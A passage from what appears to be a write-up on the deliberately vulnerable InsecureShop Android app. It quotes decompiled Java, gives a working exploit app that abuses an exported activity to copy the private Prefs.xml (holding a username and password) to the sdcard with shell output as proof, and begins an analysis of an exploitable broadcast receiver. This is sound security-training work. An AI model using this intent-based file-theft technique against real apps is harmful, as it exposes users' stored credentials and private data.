<span class="kd">private</span> <span class="kd">final</span> <span class="nc">Uri</span> <span class="nf">makeTempCopy</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">fileUri</span><span class="o">,</span> <span class="nc">String</span> <span class="n">original_filename</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="nc">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
        <span class="nc">File</span> <span class="n">externalStorageDirectory</span> <span class="o">=</span> <span class="nc">Environment</span><span class="o">.</span><span class="na">getExternalStorageDirectory</span><span class="o">();</span>
        <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">externalStorageDirectory</span><span class="o">,</span> <span class="s">"Environment.getExternalStorageDirectory()"</span><span class="o">);</span>
        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">externalStorageDirectory</span><span class="o">.</span><span class="na">getAbsolutePath</span><span class="o">());</span>
        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="nc">File</span><span class="o">.</span><span class="na">separator</span><span class="o">);</span>
        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"insecureshop"</span><span class="o">);</span>
        <span class="nc">String</span> <span class="n">path</span> <span class="o">=</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
        <span class="nc">File</span> <span class="n">directory</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(!</span><span class="n">directory</span><span class="o">.</span><span class="na">exists</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">directory</span><span class="o">.</span><span class="na">mkdirs</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="nc">File</span> <span class="n">fileTemp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="n">original_filename</span><span class="o">);</span>
        <span class="n">fileTemp</span><span class="o">.</span><span class="na">createNewFile</span><span class="o">();</span>
        <span class="nc">Uri</span> <span class="n">fromFile</span> <span class="o">=</span> <span class="nc">Uri</span><span class="o">.</span><span class="na">fromFile</span><span class="o">(</span><span class="n">fileTemp</span><span class="o">);</span>
        <span class="nc">InputStream</span> <span class="n">openInputStream</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">().</span><span class="na">openInputStream</span><span class="o">(</span><span class="n">fileUri</span><span class="o">);</span>
        <span class="nc">OutputStream</span> <span class="n">openOutputStream</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">().</span><span class="na">openOutputStream</span><span class="o">(</span><span class="n">fromFile</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bArr</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">8192</span><span class="o">];</span>
        <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">Integer</span> <span class="n">len</span> <span class="o">=</span> <span class="n">openInputStream</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">?</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">openInputStream</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">bArr</span><span class="o">))</span> <span class="o">:</span> <span class="kc">null</span><span class="o">;</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">len</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">len</span><span class="o">.</span><span class="na">intValue</span><span class="o">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
            <span class="o">}</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">len</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="kt">int</span> <span class="n">it</span> <span class="o">=</span> <span class="n">len</span><span class="o">.</span><span class="na">intValue</span><span class="o">();</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">openOutputStream</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">openOutputStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">bArr</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">it</span><span class="o">);</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>

<span class="kd">public</span> <span class="kd">final</span> <span class="nc">String</span> <span class="nf">getFilename</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">uri</span><span class="o">)</span> <span class="o">{</span>
    <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkParameterIsNotNull</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="s">"uri"</span><span class="o">);</span>
    <span class="nc">String</span> <span class="n">fileName</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="nc">Context</span> <span class="n">context</span> <span class="o">=</span> <span class="n">getApplicationContext</span><span class="o">();</span>
    <span class="nc">String</span> <span class="n">scheme</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="nc">Intrinsics</span><span class="o">.</span><span class="na">areEqual</span><span class="o">(</span><span class="n">scheme</span><span class="o">,</span> <span class="s">"file"</span><span class="o">))</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">uri</span><span class="o">.</span><span class="na">getLastPathSegment</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="k">if</span> <span class="o">(!</span><span class="nc">Intrinsics</span><span class="o">.</span><span class="na">areEqual</span><span class="o">(</span><span class="n">scheme</span><span class="o">,</span> <span class="s">"content"</span><span class="o">))</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">fileName</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="s">"context"</span><span class="o">);</span>
    <span class="nc">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getContentResolver</span><span class="o">().</span><span class="na">query</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="k">new</span> <span class="nc">String</span><span class="o">[]{</span><span class="s">"_display_name"</span><span class="o">},</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">cursor</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getCount</span><span class="o">()</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">fileName</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kt">int</span> <span class="n">columnIndex</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getColumnIndexOrThrow</span><span class="o">(</span><span class="s">"_display_name"</span><span class="o">);</span>
    <span class="n">cursor</span><span class="o">.</span><span class="na">moveToFirst</span><span class="o">();</span>
    <span class="k">return</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">columnIndex</span><span class="o">);</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>The code is a bit long but let’s break it down, beginning with the Intent:</p><ul><li>checks if the intent has extras and specifically looks for an extra with the key <code class="language-plaintext highlighter-rouge">android.intent.extra.STREAM</code>.<li><strong><code class="language-plaintext highlighter-rouge">Parcelable parcelableExtra = getIntent().getParcelableExtra("android.intent.extra.STREAM")</code></strong>: Retrieves a Parcelable extra from the intent with the key <code class="language-plaintext highlighter-rouge">android.intent.extra.STREAM</code>. This is typically used to pass complex data between components.<li><strong><code class="language-plaintext highlighter-rouge">Uri uri = Uri.fromFile(new File(((Uri) parcelableExtra).toString()))</code></strong>: Converts the Parcelable object (which should be a <code class="language-plaintext highlighter-rouge">Uri</code>) into a <code class="language-plaintext highlighter-rouge">File</code> object and then creates a <code class="language-plaintext highlighter-rouge">Uri</code> from that file. This line assumes that the Parcelable extra is a <code class="language-plaintext highlighter-rouge">Uri</code> that represents a file path.<li>Creates a temporary copy of the file, and handles it using <code class="language-plaintext highlighter-rouge">makeTempCopy</code>.</ul><p>Moving to the <strong><code class="language-plaintext highlighter-rouge">makeTempCopy()</code> :</strong></p><ul><li>Creates a temporary copy of the file specified by the <code class="language-plaintext highlighter-rouge">Uri</code>.<li>It reads the content of the original file and writes it to a new file in the external storage directory (<code class="language-plaintext highlighter-rouge">/sdcard/insecureshop/</code>).</ul><p>Moving to the <strong><code class="language-plaintext highlighter-rouge">getFilename()</code>:</strong></p><ul><li>This method determines the filename from a <code class="language-plaintext highlighter-rouge">Uri</code>.</ul><p>Based upon the above information, let’s create an exploit app with following code to seal a copy from the <code class="language-plaintext highlighter-rouge">Prefs.xml</code> file as an example:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
<span class="nd">@Override</span>
<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
    <span class="nc">Button</span> <span class="nc">TheftofArbitraryFilesButton</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Button</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">TheftofArbitraryFiles</span><span class="o">);</span>

    <span class="c1">// Set a click listener to send the intent</span>
    <span class="nc">TheftofArbitraryFilesButton</span><span class="o">.</span><span class="na">setOnClickListener</span><span class="o">(</span><span class="k">new</span> <span class="nc">View</span><span class="o">.</span><span class="na">OnClickListener</span><span class="o">()</span> <span class="o">{</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onClick</span><span class="o">(</span><span class="nc">View</span> <span class="n">v</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Intent</span> <span class="nc">StealingFile</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
        <span class="c1">// Selecting the ChooserActivity</span>
        <span class="nc">StealingFile</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.insecureshop"</span><span class="o">,</span> <span class="s">"com.insecureshop.ChooserActivity"</span><span class="o">);</span>
        <span class="c1">// Specfiying the Prefs.xml file</span>
        <span class="nc">Uri</span> <span class="nc">FileName</span> <span class="o">=</span> <span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"/data/data/com.insecureshop/shared_prefs/Prefs.xml"</span><span class="o">);</span>
        <span class="c1">// adding the EXTRA_STREAM as an extra to trigger the exported Intent</span>
        <span class="nc">StealingFile</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="nc">StealingFile</span><span class="o">.</span><span class="na">EXTRA_STREAM</span><span class="o">,</span> <span class="nc">FileName</span><span class="o">);</span>
        <span class="c1">// Starting the Intent</span>
        <span class="n">startActivity</span><span class="o">(</span><span class="nc">StealingFile</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="o">});</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Let’s Install the application:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%2011.png" alt="image.png" /></p><p>Clicking the button and checking the SDCARD files if we were able to steal the <code class="language-plaintext highlighter-rouge">Prefs.xml</code> file.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>root@generic_x86:/data/local/tmp <span class="nv">$ </span><span class="nb">cd</span> /sdcard/
root@generic_x86:/data/local/tmp <span class="nv">$ </span><span class="nb">ls
</span>Alarms/         Download/       Notifications/  Ringtones/
Android/        Movies/         Pictures/       insecureshop/
DCIM/           Music/          Podcasts/
root@generic_x86:/sdcard/insecureshop <span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nt">-rw-rw----</span> root     sdcard_rw     2539 2024-08-29 14:41 Prefs.xml
root@generic_x86:/sdcard/insecureshop <span class="nv">$ </span><span class="nb">cat </span>Prefs.xml
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s1">'1.0'</span> <span class="nv">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span> <span class="nv">standalone</span><span class="o">=</span><span class="s1">'yes'</span> ?&gt;
&lt;map&gt;
&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"username"</span><span class="o">&gt;</span>shopuser&lt;/string&gt;
&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"password"</span><span class="o">&gt;!</span>ns3csh0p&lt;/string&gt;
&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"productList"</span><span class="o">&gt;[{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:1,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/7974/pexels-photo.jpg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Laptop&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>80&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:1,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}</span>,<span class="o">{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:2,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/984619/pexels-photo-984619.jpeg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Hat&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>10&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:2,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}</span>,<span class="o">{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:3,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/343720/pexels-photo-343720.jpeg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Sunglasses&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>10&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:4,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}</span>,<span class="o">{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:4,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/277390/pexels-photo-277390.jpeg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Watch&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>30&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:4,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}</span>,<span class="o">{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:5,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/225157/pexels-photo-225157.jpeg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Camera&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>40&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:2,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}</span>,<span class="o">{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:6,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/264819/pexels-photo-264819.jpeg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Perfumes&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>10&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:2,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}</span>,<span class="o">{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:7,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/532803/pexels-photo-532803.jpeg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Bagpack&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>20&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:2,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}</span>,<span class="o">{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:8,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/789812/pexels-photo-789812.jpeg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Jacket&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>20&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:2,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}]</span>&lt;/string&gt;
&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"data"</span><span class="o">&gt;</span>https://itsfading.github.io&lt;/string&gt;
&lt;/map&gt;
</pre></table></code></div></div><p>Great, we can now steal any file from the application directory and make a copy of it.</p><h2 id="insecure-broadcast-receiver"><strong>Insecure Broadcast Receiver</strong></h2><blockquote><p><strong>Description:</strong> An exported activity registers a broadcast during <code class="language-plaintext highlighter-rouge">onCreate</code> method execution. An attacker can trigger this broadcast and provide arbitrary URL in <code class="language-plaintext highlighter-rouge">'web_url'</code> parameter.</p></blockquote><p>While reviewing the classes, I found that there is a class named <code class="language-plaintext highlighter-rouge">com.insecureshop.CustomReceiver</code> which has a new receiver being initiated along with the <code class="language-plaintext highlighter-rouge">onRecive</code> method:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">final</span> <span class="kd">class</span> <span class="nc">CustomReceiver</span> <span class="kd">extends</span> <span class="nc">BroadcastReceiver</span> <span class="o">{</span>
<span class="nd">@Override</span> <span class="c1">// android.content.BroadcastReceiver</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceive</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
    <span class="nc">Bundle</span> <span class="n">extras</span><span class="o">;</span>
    <span class="nc">String</span> <span class="n">stringExtra</span> <span class="o">=</span> <span class="o">(</span><span class="n">intent</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="o">(</span><span class="n">extras</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getExtras</span><span class="o">())</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">?</span> <span class="kc">null</span> <span class="o">:</span> <span class="n">extras</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">"web_url"</span><span class="o">);</span>
    <span class="nc">String</span> <span class="n">str</span> <span class="o">=</span> <span class="n">stringExtra</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">(!(</span><span class="n">str</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="nc">StringsKt</span><span class="o">.</span><span class="na">isBlank</span><span class="o">(</span><span class="n">str</span><span class="o">)))</span> <span class="o">{</span>
        <span class="nc">Intent</span> <span class="n">intent2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="nc">WebView2Activity</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">intent2</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"url"</span><span class="o">,</span> <span class="n">stringExtra</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">context</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">context</span><span class="o">.</span><span class="na">startActivity</span><span class="o">(</span><span class="n">intent2</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Here, the <code class="language-plaintext highlighter-rouge">onRecive</code> method is defining what will happen when a broadcast Intent/message is received. It will look for a key <code class="language-plaintext highlighter-rouge">web_url</code> and the value for it will be passed to the <code class="language-plaintext highlighter-rouge">WebView2Activity</code> to display this URL. But to trigger this broadcast, we first need to search where this custom receiver is being used. A quick search will reveal that <code class="language-plaintext highlighter-rouge">com.insecureshop.AboutUsActivity</code> is using it. Let’s examine its code:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="n">setContentView</span><span class="o">(</span><span class="no">C0893R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_about_us</span><span class="o">);</span>
    <span class="c1">// Custom receiver object created</span>
    <span class="nc">CustomReceiver</span> <span class="n">customReceiver</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">CustomReceiver</span><span class="o">();</span>
    <span class="k">this</span><span class="o">.</span><span class="na">receiver</span> <span class="o">=</span> <span class="n">customReceiver</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">customReceiver</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">throwUninitializedPropertyAccessException</span><span class="o">(</span><span class="s">"receiver"</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="c1">// registering the reciever with a specific Intent</span>
    <span class="n">registerReceiver</span><span class="o">(</span><span class="n">customReceiver</span><span class="o">,</span> <span class="k">new</span> <span class="nc">IntentFilter</span><span class="o">(</span><span class="s">"com.insecureshop.CUSTOM_INTENT"</span><span class="o">));</span>
<span class="o">}</span>

<span class="nd">@Override</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">onDestroy</span><span class="o">()</span> <span class="o">{</span>
    <span class="nc">CustomReceiver</span> <span class="n">customReceiver</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">receiver</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">customReceiver</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">throwUninitializedPropertyAccessException</span><span class="o">(</span><span class="s">"receiver"</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="n">unregisterReceiver</span><span class="o">(</span><span class="n">customReceiver</span><span class="o">);</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onDestroy</span><span class="o">();</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Let’s break it down:</p><ul><li><strong><code class="language-plaintext highlighter-rouge">CustomReceiver customReceiver = new CustomReceiver();</code></strong>: This creates an instance of <code class="language-plaintext highlighter-rouge">CustomReceiver</code>, which is a custom class extending <code class="language-plaintext highlighter-rouge">BroadcastReceiver</code>.<li><strong><code class="language-plaintext highlighter-rouge">registerReceiver(customReceiver, new IntentFilter("com.insecureshop.CUSTOM_INTENT"));</code></strong>: This registers the <code class="language-plaintext highlighter-rouge">customReceiver</code> to listen for broadcasts with the action <code class="language-plaintext highlighter-rouge">"com.insecureshop.CUSTOM_INTENT"</code>. The <code class="language-plaintext highlighter-rouge">IntentFilter</code> specifies the action that the receiver should respond to. When an <code class="language-plaintext highlighter-rouge">Intent</code> with this action is broadcasted, the <code class="language-plaintext highlighter-rouge">onReceive</code> method of <code class="language-plaintext highlighter-rouge">CustomReceiver</code> will be triggered.<li><strong><code class="language-plaintext highlighter-rouge">onDestroy()</code></strong>: This method is called when the activity is about to be destroyed. It is typically used to clean up resources.</ul><p>One thing to note here, as many writeups getting it wrong, the <code class="language-plaintext highlighter-rouge">AboutUsActivity</code> is exported in <code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code></p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">"com.insecureshop.AboutUsActivity"</span> <span class="na">android:exported=</span><span class="s">"true"</span><span class="nt">/&gt;</span> 
